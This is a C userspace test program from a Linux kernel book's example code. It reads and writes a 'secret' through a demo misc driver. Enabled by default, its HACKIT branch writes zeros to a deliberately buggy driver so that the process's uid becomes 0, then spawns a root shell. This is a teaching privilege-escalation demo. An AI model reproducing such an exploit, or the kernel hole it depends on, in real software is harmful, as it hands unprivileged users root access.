/*
 * ch9/miscdrv_rdwr/rdwr_drv_secret.c
 ***************************************************************
 * This program is part of the source code released for the book
 *  "Linux Kernel Development Cookbook"
 *  (c) Author: Kaiwan N Billimoria
 *  Publisher:  Packt
 *  GitHub repository:
 *  https://github.com/PacktPublishing/Linux-Kernel-Development-Cookbook
 *
 * From: Ch : Synchronization Primitives and How to Use Them
 ****************************************************************
 * Brief Description:
 * A simple test bed for the miscdrv_rdwr demo driver; a small userspace app to
 * issue the read(2) and write(2) system calls upon a given (device) file.
 * Also, again as a demo, we use the read(2) to retreive the 'secret' <eye-roll>
 * from the driver within kernel-space. Equivalently, one can use the write(2)
 * change the 'secret' (just plain text).
 *
 * NEW:
 * This particular version differs from the earlier one in one regard: we have
 * a macro HACKIT; if it's defined, this process will deliberately write only
 * zero's into the userspace buffer and send that to our 'bad' driver's write
 * method. If the driver has the DANGER_GETROOT_BUG macro defined, then it will
 * write this into the process's UID member, thus making us root!
 *
 * For details, please refer the book, Ch 9.
 */
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <limits.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>

#define MAXBYTES    128   /* Must match the driver; we should actually use a
			   * common header file for things like this */
static int stay_alive = 0;

static inline void usage(char *prg)
{
	fprintf(stderr,"Usage: %s opt=read/write device_file [\"secret-msg\"]\n"
			" opt = 'r' => we shall issue the read(2), retreiving the 'secret' form the driver\n"
			" opt = 'w' => we shall issue the write(2), writing the secret message <secret-msg>\n"
			"  (max %d bytes)\n",
		       prg, MAXBYTES);
}

int main(int argc, char **argv)
{
	char opt = 'r';
	int fd, flags = O_RDONLY;
	ssize_t n;
	char *buf = NULL;
	size_t num = 0;
	
#define HACKIT
//#undef HACKIT

#ifdef HACKIT
	if (getuid() == 0) {
		printf("%s: Don't run this as root.\n", argv[0]);
		exit(EXIT_FAILURE);
	}
#endif
	if (argc < 3) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	opt = argv[1][0];
	if (opt != 'r' && opt != 'w') {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	if( (opt == 'w' && argc != 4) ||
	    (opt == 'r' && argc != 3)) {
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}
	if ('w' == opt && strlen(argv[3]) > MAXBYTES) {
		fprintf(stderr, "%s: too big a secret (%zu bytes); pl restrict"
				" to %d bytes max\n", argv[0], strlen(argv[3]), MAXBYTES);
		exit(EXIT_FAILURE);
	}

	if ('w' == opt)
		flags = O_WRONLY;
	if( (fd=open(argv[2], flags, 0)) == -1) {
		fprintf(stderr, "%s: open(2) on %s failed\n", argv[0], argv[2]);
		perror("open");
		exit(EXIT_FAILURE);
	}
	printf("Device file %s opened (in %s mode): fd=%d\n",
		       argv[2], (flags == O_RDONLY ? "read-only" : "write-only"), fd);

	if ('w' == opt)
		num = strlen(argv[3])+1; // IMP! +1 to include the NULL byte!
	else
		num = MAXBYTES;

	buf = malloc(num);
	if (!buf) {
		fprintf(stderr,"%s: out of memory!\n", argv[0]);
		close(fd);
		exit(EXIT_FAILURE);
	}

	if ('r' == opt) {
		printf("%s: dest buf addr = %p\n", argv[0], buf);
		n = read(fd, buf, num);
		if( n < 0 ) {
			perror("read failed");
			fprintf(stderr, "Tip: see kernel log\n");
			free(buf); close(fd);
			exit(EXIT_FAILURE);
		}
		printf("%s: read %zu bytes from %s\n", argv[0], n, argv[2]);
		printf("The 'secret' is:\n \"%.*s\"\n", (int)n, buf);
	} else {

#ifndef HACKIT
		strncpy(buf, argv[3], num);
#else
		printf("%s: attempting to get root ...\n", argv[0]);
		/* Write only 0's ... our 'bad' driver will write this into
		 * this process's current->cred->uid member, thus making us
		 * root ! */
		memset(buf, 0, num);
#endif
		n = write(fd, buf, num);
		if( n < 0 ) {
			perror("write failed");
			fprintf(stderr, "Tip: see kernel log\n");
			free(buf); close(fd);
			exit(EXIT_FAILURE);
		}
		printf("%s: wrote %zu bytes to %s\n", argv[0], n, argv[2]);
#ifdef HACKIT
		if (getuid() == 0) {
			printf(" !Pwned! uid==%d\n", getuid());
			/* the hacker's holy grail: spawn a root shell */
			execl("/bin/sh", "sh", (char *)NULL);
		}
#endif
	}

	if (stay_alive) {
		printf("%s:%d: stayin' alive (in pause()) ... \n", argv[0], getpid());
		pause();
	}

	free(buf);
	close(fd);
	exit(EXIT_SUCCESS);       
}
